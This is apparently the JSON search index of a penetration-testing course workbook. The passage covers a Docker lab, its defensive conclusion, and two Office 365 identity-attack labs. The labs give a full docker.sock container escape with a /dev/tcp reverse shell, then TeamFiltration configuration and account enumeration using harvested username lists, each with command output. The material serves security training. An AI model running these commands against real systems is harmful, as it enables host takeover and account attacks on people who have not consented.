\"lscr.io/linuxserver/heimdall:latest\" \"amir20/dozzle:latest\" \" debian:bookworm-slim \" \"portainer/portainer-ce:latest\" \"jc21/nginx-proxy-manager:latest\" \"bukuserver/bukuserver:latest\" \"jc21/mariadb-aria:latest\" Did you notice this list the following Tag: debian:bookworm-slim This tag indicates that we have a local Debian 12 image. Let's go ahead and use this to gain full system access. How can we gain full system access back to this host? Well we can do this by leveraging the docker.sock. Let's go ahead and build us a script for this in our attacker shell. Note The IP address of the host is needed for this as well Command lines export IP = 192.168.4.9 The command below will create a container with a command line that executes a bash shell back to our host. This shell runs interactive bash. We are also going to run chroot such that the directory we are in will be equivalent to the host. Command lines export CMD = \"[\\\"/bin/sh\\\",\\\"-c\\\",\\\"chroot /tmp sh -c \\\\\\\"bash -c 'bash -i &>/dev/tcp/ $IP /9997 0<&1'\\\\\\\"\\\"]\" Command lines export CONTAINER_NAME = hack-container The command below directs the Docker API to create a container with all the variables listed. This will not start the container but will create it. Command lines curl -s -X POST --unix-socket /var/run/docker.sock -d \"{\\\"Image\\\":\\\"debian:bookworm-slim\\\",\\\"cmd\\\": $CMD ,\\\"Binds\\\":[\\\"/:/tmp:rw\\\"]}\" -H 'Content-Type: application/json' http://localhost/containers/create?name = ${ CONTAINER_NAME } Expected Results root@0222610d7c9e:/# export IP = 192.168.4.9 export CMD=\"[\\\"/bin/sh\\\",\\\"-c\\\",\\\"chroot /tmp sh -c \\\\\\\"bash -c 'bash -i &>/dev/tcp/$IP/9999 0<&1'\\\\\\\"\\\"]\" export CONTAINER_NAME=hack-container root@0222610d7c9e:/# curl -s -X POST --unix-socket /var/run/docker.sock -d \"{\\\"Image\\\":\\\"debian:bookworm-slim\\\",\\\"cmd\\\": $CMD ,\\\"Binds\\\":[\\\"/:/tmp:rw\\\"]}\" -H 'Content-Type: application/json' http://localhost/containers/create?name = ${ CONTAINER_NAME } {\"Id\":\"9261f2fa60a494bf84635cb01e5ea5db30862a57ae1559e1e0402c85313b7ec1\",\"Warnings\":[]} We now have a container that we can start. Let's start that container. Command lines curl -s -X POST --unix-socket /var/run/docker.sock \"http://localhost/containers/ ${ CONTAINER_NAME } /start\" Expected Results root@0222610d7c9e:/# curl -s -X POST --unix-socket /var/run/docker.sock \"http://localhost/containers/ ${ CONTAINER_NAME } /start\" Going back to the terminal you were at you can see the output of the netcat container. Expected Results Listening on 0.0.0.0 9999 Connection received on 192.168.4.9 44974 bash: cannot set terminal process group (1): Inappropriate ioctl for device bash: no job control in this shell root@dd7a4708e810:/# While the output will not displayed here there are a few commands that you can run to prove full system access. Run the following commands ps ls /home/sec588 Technically this container is not running by dropping privileges it is enough to prove the access we have. Now let's go ahead and turn off the Docker Containers that are running in the background. Command lines cd /opt/dockerlabs/lab6 Command lines docker compose down Expected Results sec588@slingshot ~ $ cd /opt/dockerlabs/lab6 sec588@slingshot /opt/dockerlabs/lab6 $ docker compose down [+] Running 11/11 \u2714 Container vulnapp Removed 4.4s \u2714 Container dozzle Removed 3.6s \u2714 Container jenkins Removed 4.3s \u2714 Container bukuserver Removed 3.9s \u2714 Container redis Removed 3.8s \u2714 Container uptime-kuma Removed 4.3s \u2714 Container portainer Removed 3.8s \u2714 Container heimdall Removed 4.3s \u2714 Container db Removed 4.1s \u2714 Network npm-networking Removed 0.2s The containers should now be stopped. This should help reduce system containers. Please make sure to also run: Command Lines sudo systemctl stop sliver Finally make sure to close all your windows as well as we will not need them for the next labs.","title":"Docker: Assessing newer technologies"},{"location":"labs/containers/containers/#conclusion","text":"For the containers, there are multiple issues. The best way to run containers is through rootless single binary processes. Go makes the best candidate for this, but other languages can make binaries that do not rely on something other than system libraries or even environment shells to make the application work. Cgroups v2 would also make the system much more difficult to exploit as UID 0 in the container would not be UID 0 in the kernel. The final item would be around networking and the ability to firewall away network items. Putting this in a checklist makes sense. Defensive Tips The following are tips we explain to individuals Running without any binaries, minimal binaries, or even just a single binary Running without UID 0 Do not require privileges Firewall or IPTables on the host for each container (Read the Docker Firewalling Documentation) Use a docker.sock proxy to limit the number of API calls and the API requirements if you need to expose docker.sock Consistently scan for new binaries or execution within the container itself Maintain an SBOM Use some type of telemetry to see what processes are being executed within each container","title":"Conclusion"},{"location":"labs/identities/01-identities/","text":"Attacking User Identities Brief Intro Welcome to our User Identities WorkShop. Requirements for This Lab Walkthrough Setup TeamFiltration By Using AWS API Gateway. Please note if you are doing this outside of \"normal\" lab times and you are running your own lab through our Terraform Repo run the following command: Only for terraform terraform output TeamFiltration_Roy1 To setup TeamFiltration we need to have an AWS profile that will allow us to build an AWS API Gateway. In the real world, when you are in a penetration testing engagement this would be a credential that you have and control your own AWS account. We didn't have you bring one of those, so instead we are going to leverage an existing user account to make this work. We can use a tool like Teamfiltration to quickly enumerate a userlist against the Office 365 endpoint. TeamFiltration For the students that have attended the live training, please note that your instructor has provided you with the relevant TeamFiltration Configuration in Discord! Command lines cd /home/sec588/Coursefiles/workdir/ Command lines cat << EOF > /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json { \"pushoverAppKey\": \"\", \"pushoverUserKey\": \"\", \"dehashedEmail\" : \"\", \"dehashedApiKey\": \"\", \"sacrificialO365Username\": \"summer@DOMAINHERE.DOMAIN\", \"sacrificialO365Passwords\": \"SnakeJazz2020\" , \"proxyEndpoint\": \"http://127.0.0.1:8080\", \"AWSAccessKey\": \"RANDOM KEY HERE!\", \"AWSSecretKey\": \"RANDOM SECRET KEY HERE!\", \"UserAgent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.3.00.30866 Chrome/80.0.3987.165 Electron/8.5.1 Safari/537.36\", \"AwsRegions\":[\"us-east-1\", \"us-east-2\"] } EOF Expected results sec588@slingshot ~/Coursefiles/workdir $ cat << EOF > /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SE C588.json { \"pushoverAppKey\": \"\", \"pushoverUserKey\": \"\", \"dehashedEmail\" : \"\", \"dehashedApiKey\": \"\", \"sacrificialO365Username\": \"summer@DOMAINHERE.DOMAIN\", \"sacrificialO365Passwords\": \"SnakeJazz2020\" , \"proxyEndpoint\": \"http://127.0.0.1:8080\", \"AWSAccessKey\": \"RANDOM KEY HERE!\", \"AWSSecretKey\": \"RANDOM SECRET KEY HERE!\", \"UserAgent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.3.00.30866 Chrome/80.0.3987.165 Electron/8.5.1 Safari/537.36\", \"AwsRegions\":[\"us-east-1\", \"us-east-2\"] } EOF Now the question is how do we come up with usernames? Thankfully we can many sources: Linkedin Open Source Databreaches The U.S. Tax and Census data (yeah that is a thing!) Let's take a look at the top 200 names in the Tax return information for the years of 2023 and such. There are 200 male names and 200 female names listed for a total around 400 names or so. Command lines cp /var/www/html/workbook/labs/identities/files/usernames.txt /home/sec588/Coursefiles/workdir/usernames-bare.txt Command lines for i in $( cat /home/sec588/Coursefiles/workdir/usernames-bare.txt ) ; do echo $i \"@sec588workshops.onmicrosoft.com\" >> /home/sec588/Coursefiles/workdir/usernames.txt ; done If you look at this list you can see that usernames.txt is composed of various firstnames, we can combine that withour domain. In the case of the LIVE audience you can use the domain provided by the instructor. We should now run the configured teamfiltration command in order to ensure that we have valid accounts. These valid accounts will allow us to perform password attacks in the next phase of the attack. Command lines /opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --enum --validate-login --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --usernames /home/sec588/Coursefiles/workdir/usernames.txt Command line flags Here is are the command flags in teamfiltration . --outpath : This is the location where the teamfiltration database will live --enum : Run the enumeration portion of the attack --validate-login : Use the more \"noisy\" flag in this way it will have 1 bad password attempt per email address --config : This is the configuration file to use --usernames : A file containing the usernames Expected results sec588@slingshot ~/Coursefiles/workdir $ /opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --enum --validate-login --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --usernames /home/sec588/Coursefiles/workdir/usernames.txt \u2553\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u2556 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u255f\u256c\u256c\u255c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2502 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2502\u2502 \u2559\u256c\u256c\u255c\u2558 \u2514\u2559\u255c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2553\u2565\u2565\u256c\u256c\u256c\u256c\u256c\u256c\u2565\u2565\u2556 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2553\u256c\u256b\u256c\u255c\u255c\u2518 \u2559\u255c\u255c\u256c\u256b\u256c\u2510 \u2502\u2502 \u2502\u2502 \u2514\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u255c\u2559\u2569\u256c\u2556\u2553 \u2559\u256c\u256c\u256c \u2502\u2502 \u2502\u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u255c \u2559\u256c\u256b\u2556\u2556 \u2553 \u2559\u256c\u2556 \u2502\u2502 \u251c\u2502\u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c \u2553\u2556 \u2559\u256c\u256c\u256c\u256c\u256c\u256c\u2566 \u256c\u256c \u2502\u250c \u2553\u256c\u2524\u2502\u2502 \u2553\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2553\u256c\u2524 \u256c\u256c\u256c \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u255c\u255c\u255c\u256c\u256c\u2556 \u255f\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u2555 \u250c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u2524 \u2559\u2569\u2518 \u2559\u256c\u256c\u256c\u256c\u256c\u2569 \u255f\u256c\u256c \u2559\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u256c\u256c\u2556\u2556\u2556\u2566\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u2524 \u255f\u256c\u256c \u2502\u2502 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c \u2566\u2556 \u2557\u2556 \u256c\u256c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2514\u256c\u2510 \u2559\u256c\u2556\u2556 \u2553\u256c\u256c\u255c \u2553\u256c\u2518 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2514\u256c\u2556 \u2559\u2569\u2568\u256c\u256c\u256c\u2569\u2568\u255c\u255c \u2552\u256c\u256c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u256c\u256c\u256c\u2556 \u250c\u2556\u256b\u256c\u255c\u2518 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u2569\u256c\u256c\u256c\u2565\u2565\u2565\u2565\u2565\u2565\u256b\u256c\u256c\u255c\u255c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u2559\u255c\u255c\u255c\u255b \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u2502 \u2553\u2556\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u256c\u2566\u2566\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u2553\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u256c\u2556\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u2514\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u255c \u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c [\u2665] TeamFiltration V3.5.2 PUBLIC, created by @Flangvik at @TrustedSec [+] Args parsed --outpath /home/sec588/Coursefiles/workdir/teamfiltration --enum --validate-login --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --usernames /home/sec588/Coursefiles/workdir/usernames.txt [ENUM] 7/10/2023 4:19:16 PM EST Filtering out previusly attempted accounts [ENUM] 7/10/2023 4:19:17 PM EST Warning, THIS METHOD WILL PRODUCE LOGIN ATTEMPTS AND IF USED FREQUENTLY,MAY LOCKOUT ACCOUNTS! [ENUM] 7/10/2023 4:19:17 PM EST Enumerating 15 accounts with password Welcome@2023!, this will take ~0 minutes [FIREPROX] 7/10/2023 4:19:18 PM EST Created endpoint https://h3dsur5q5f.execute-api.us-east-2.amazonaws.com/fireprox/ [ENUM] 7/10/2023 4:19:19 PM EST jerry@DOMAINHERE.DOMAIN => VALID [ENUM] 7/10/2023 4:19:19 PM EST terry@DOMAINHERE.DOMAIN => VALID [ENUM] 7/10/2023 4:19:19 PM EST gary@DOMAINHERE.DOMAIN => VALID [ENUM] 7/10/2023 4:19:19 PM EST tammy@DOMAINHERE.DOMAIN => VALID [ENUM] 7/10/2023 4:19:20 PM EST summer@DOMAINHERE.DOMAIN => VALID [FIREPROX] 7/10/2023 4:19:20 PM EST Deleted endpoint https://h3dsur5q5f.execute-api.us-east-2.amazonaws.com/fireprox/ During this excerise you may see that this process takes a few tries however we are able to fully capture all of the logins we wish to see. Why This Lab Is Important Username harvesting can be \u00bd of your password cracking capability for live systems. We will see how to use password guessing in a future lab. For now, understanding username construction, harvesting, and validity will be an essential step. In a future lab, we will also see how to accomplish the same thing in AWS.","title":"Identities Lab 1"},{"location":"labs/identities/01-identities/#attacking-user-identities","text":"","title":"Attacking User Identities"},{"location":"labs/identities/01-identities/#brief-intro","text":"Welcome to our User Identities WorkShop.","title":"Brief Intro"},{"location":"labs/identities/01-identities/#requirements-for-this-lab","text":"","title":"Requirements for This Lab"},{"location":"labs/identities/01-identities/#walkthrough","text":"Setup TeamFiltration By Using AWS API Gateway. Please note if you are doing this outside of \"normal\" lab times and you are running your own lab through our Terraform Repo run the following command: Only for terraform terraform output TeamFiltration_Roy1 To setup TeamFiltration we need to have an AWS profile that will allow us to build an AWS API Gateway. In the real world, when you are in a penetration testing engagement this would be a credential that you have and control your own AWS account. We didn't have you bring one of those, so instead we are going to leverage an existing user account to make this work. We can use a tool like Teamfiltration to quickly enumerate a userlist against the Office 365 endpoint. TeamFiltration For the students that have attended the live training, please note that your instructor has provided you with the relevant TeamFiltration Configuration in Discord! Command lines cd /home/sec588/Coursefiles/workdir/ Command lines cat << EOF > /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json { \"pushoverAppKey\": \"\", \"pushoverUserKey\": \"\", \"dehashedEmail\" : \"\", \"dehashedApiKey\": \"\", \"sacrificialO365Username\": \"summer@DOMAINHERE.DOMAIN\", \"sacrificialO365Passwords\": \"SnakeJazz2020\" , \"proxyEndpoint\": \"http://127.0.0.1:8080\", \"AWSAccessKey\": \"RANDOM KEY HERE!\", \"AWSSecretKey\": \"RANDOM SECRET KEY HERE!\", \"UserAgent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.3.00.30866 Chrome/80.0.3987.165 Electron/8.5.1 Safari/537.36\", \"AwsRegions\":[\"us-east-1\", \"us-east-2\"] } EOF Expected results sec588@slingshot ~/Coursefiles/workdir $ cat << EOF > /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SE C588.json { \"pushoverAppKey\": \"\", \"pushoverUserKey\": \"\", \"dehashedEmail\" : \"\", \"dehashedApiKey\": \"\", \"sacrificialO365Username\": \"summer@DOMAINHERE.DOMAIN\", \"sacrificialO365Passwords\": \"SnakeJazz2020\" , \"proxyEndpoint\": \"http://127.0.0.1:8080\", \"AWSAccessKey\": \"RANDOM KEY HERE!\", \"AWSSecretKey\": \"RANDOM SECRET KEY HERE!\", \"UserAgent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.3.00.30866 Chrome/80.0.3987.165 Electron/8.5.1 Safari/537.36\", \"AwsRegions\":[\"us-east-1\", \"us-east-2\"] } EOF Now the question is how do we come up with usernames? Thankfully we can many sources: Linkedin Open Source Databreaches The U.S. Tax and Census data (yeah that is a thing!) Let's take a look at the top 200 names in the Tax return information for the years of 2023 and such. There are 200 male names and 200 female names listed for a total around 400 names or so. Command lines cp /var/www/html/workbook/labs/identities/files/usernames.txt /home/sec588/Coursefiles/workdir/usernames-bare.txt Command lines for i in $( cat /home/sec588/Coursefiles/workdir/usernames-bare.txt ) ; do echo $i \"@sec588workshops.onmicrosoft.com\" >> /home/sec588/Coursefiles/workdir/usernames.txt ; done If you look at this list you can see that usernames.txt is composed of various firstnames, we can combine that withour domain. In the case of the LIVE audience you can use the domain provided by the instructor. We should now run the configured teamfiltration command in order to ensure that we have valid accounts. These valid accounts will allow us to perform password attacks in the next phase of the attack. Command lines /opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --enum --validate-login --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --usernames /home/sec588/Coursefiles/workdir/usernames.txt Command line flags Here is are the command flags in teamfiltration . --outpath : This is the location where the teamfiltration database will live --enum : Run the enumeration portion of the attack --validate-login : Use the more \"noisy\" flag in this way it will have 1 bad password attempt per email address --config : This is the configuration file to use --usernames : A file containing the usernames Expected results sec588@slingshot ~/Coursefiles/workdir $ /opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --enum --validate-login --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --usernames /home/sec588/Coursefiles/workdir/usernames.txt \u2553\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u2556 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u255f\u256c\u256c\u255c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2502 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2502\u2502 \u2559\u256c\u256c\u255c\u2558 \u2514\u2559\u255c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2553\u2565\u2565\u256c\u256c\u256c\u256c\u256c\u256c\u2565\u2565\u2556 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2553\u256c\u256b\u256c\u255c\u255c\u2518 \u2559\u255c\u255c\u256c\u256b\u256c\u2510 \u2502\u2502 \u2502\u2502 \u2514\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u255c\u2559\u2569\u256c\u2556\u2553 \u2559\u256c\u256c\u256c \u2502\u2502 \u2502\u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u255c \u2559\u256c\u256b\u2556\u2556 \u2553 \u2559\u256c\u2556 \u2502\u2502 \u251c\u2502\u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c \u2553\u2556 \u2559\u256c\u256c\u256c\u256c\u256c\u256c\u2566 \u256c\u256c \u2502\u250c \u2553\u256c\u2524\u2502\u2502 \u2553\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2553\u256c\u2524 \u256c\u256c\u256c \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u255c\u255c\u255c\u256c\u256c\u2556 \u255f\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u2555 \u250c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u2524 \u2559\u2569\u2518 \u2559\u256c\u256c\u256c\u256c\u256c\u2569 \u255f\u256c\u256c \u2559\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u256c\u256c\u2556\u2556\u2556\u2566\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u2524 \u255f\u256c\u256c \u2502\u2502 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c \u2566\u2556 \u2557\u2556 \u256c\u256c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2514\u256c\u2510 \u2559\u256c\u2556\u2556 \u2553\u256c\u256c\u255c \u2553\u256c\u2518 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2514\u256c\u2556 \u2559\u2569\u2568\u256c\u256c\u256c\u2569\u2568\u255c\u255c \u2552\u256c\u256c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u256c\u256c\u256c\u2556 \u250c\u2556\u256b\u256c\u255c\u2518 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u2569\u256c\u256c\u256c\u2565\u2565\u2565\u2565\u2565\u2565\u256b\u256c\u256c\u255c\u255c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u2559\u255c\u255c\u255c\u255b \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u2502 \u2553\u2556\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u256c\u2566\u2566\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u2553\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u256c\u2556\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u2514\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u255c \u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c [\u2665] TeamFiltration V3.5.2 PUBLIC, created by @Flangvik at @TrustedSec [+] Args parsed --outpath /home/sec588/Coursefiles/workdir/teamfiltration --enum --validate-login --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --usernames /home/sec588/Coursefiles/workdir/usernames.txt [ENUM] 7/10/2023 4:19:16 PM EST Filtering out previusly attempted accounts [ENUM] 7/10/2023 4:19:17 PM EST Warning, THIS METHOD WILL PRODUCE LOGIN ATTEMPTS AND IF USED FREQUENTLY,MAY LOCKOUT ACCOUNTS! [ENUM] 7/10/2023 4:19:17 PM EST Enumerating 15 accounts with password Welcome@2023!, this will take ~0 minutes [FIREPROX] 7/10/2023 4:19:18 PM EST Created endpoint https://h3dsur5q5f.execute-api.us-east-2.amazonaws.com/fireprox/ [ENUM] 7/10/2023 4:19:19 PM EST jerry@DOMAINHERE.DOMAIN => VALID [ENUM] 7/10/2023 4:19:19 PM EST terry@DOMAINHERE.DOMAIN => VALID [ENUM] 7/10/2023 4:19:19 PM EST gary@DOMAINHERE.DOMAIN => VALID [ENUM] 7/10/2023 4:19:19 PM EST tammy@DOMAINHERE.DOMAIN => VALID [ENUM] 7/10/2023 4:19:20 PM EST summer@DOMAINHERE.DOMAIN => VALID [FIREPROX] 7/10/2023 4:19:20 PM EST Deleted endpoint https://h3dsur5q5f.execute-api.us-east-2.amazonaws.com/fireprox/ During this excerise you may see that this process takes a few tries however we are able to fully capture all of the logins we wish to see.","title":"Walkthrough"},{"location":"labs/identities/01-identities/#why-this-lab-is-important","text":"Username harvesting can be \u00bd of your password cracking capability for live systems. We will see how to use password guessing in a future lab. For now, understanding username construction, harvesting, and validity will be an essential step. In a future lab, we will also see how to accomplish the same thing in AWS.","title":"Why This Lab Is Important"},{"location":"labs/identities/02-identities/","text":"Attacking User Identities - Passwords! Brief Intro Welcome to our User Identities WorkShop Section 2, PASSWORDS! Requirements for This Lab Walkthrough We are now going to create a list of passwords in a file. This password file can be found here . You can also download it using the following command line snippet: Command lines cd /home/sec588/Coursefiles/workdir Command lines wget http://localhost/workbook/labs/identities/files/passwords.txt Expected results sec588@slingshot:/opt/Wordlister$ wget http://localhost/workbook/labs/identities/files/passwords.txt --2022-07-19 22:17:33-- http://localhost/workbook/labs/identities/files/passwords.txt Resolving localhost (localhost)... 127.0.0.1, ::1 Connecting to localhost (localhost)|127.0.0.1|:8000... connected. 